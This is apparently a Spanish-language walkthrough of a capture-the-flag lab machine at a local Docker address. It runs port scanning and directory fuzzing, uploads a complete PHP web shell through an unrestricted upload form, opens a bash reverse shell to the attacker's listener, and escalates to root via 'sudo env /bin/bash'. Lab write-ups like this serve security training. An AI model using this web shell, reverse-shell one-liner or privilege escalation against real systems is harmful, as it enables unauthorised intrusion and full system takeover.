Fecha: 05/09/2024

Comienzo haciendo nmap:
```bash
sudo nmap -p- -sS -sC -sV --min-rate 5000 -n -Pn 172.17.0.2 -oN scan
```

![](imágenes/Pasted%20image%2020240905153504.png)
Comienzo inspeccionando la página del puerto 80, sin encontrar nada interesante, así que hago fuzzing: 

```shell
ffuf -c -w /usr/share/wordlists/directory-list-2.3-medium.txt -u http://172.17.0.2/FUZZ  -e .php,.html,.txt,.js,.py -o fuzzing  
```

![](imágenes/Pasted%20image%2020240905153726.png)

Por lo que parece hay un directorio /uploads, así que es posible que se pueda hacer Local File Inclusion. 

Desde /upload.php se pueden subir archivos, subiré una shell de php desde la que poder hacerme una reverse shell: 

![](imágenes/Pasted%20image%2020240905153824.png)

```php
SHELL:  
<html>
<body>
<form method="GET" name="<?php echo basename($_SERVER['PHP_SELF']); ?>">
<input type="TEXT" name="cmd" autofocus id="cmd" size="80">
<input type="SUBMIT" value="Execute">
</form>
<pre>
<?php
    if(isset($_GET['cmd']))
    {
        system($_GET['cmd'] . ' 2>&1');
    }
?>
</pre>
</body>
</html>
```

Me deja subirlo sin ningún problema, así que accedo a él a través del directorio /uploads:
![](imágenes/Pasted%20image%2020240905154321.png)

```bash
# En la linea de comandos virtual:
bash -c 'bash -i >& /dev/tcp/172.17.0.1/9001 0>&1'
# En mi máquina atacante:
nc -lvnp 9001
```

Lo primero que haré será tratar la tty: 
```bash
# Empezando desde la reverse shell:
script /dev/null -c bash

Control Z 

stty raw -echo; fg

reset xterm

export TERM=xterm
```

Veo que puedo ejecutar env como root sin necesidad de usar la contraseña:
![](imágenes/Pasted%20image%2020240905154430.png)

Miro en https://gtfobins.github.io/gtfobins/env/#sudo y encuentro que ejecutando `sudo env /bin/bash`: 
![](imágenes/Pasted%20image%2020240905154520.png)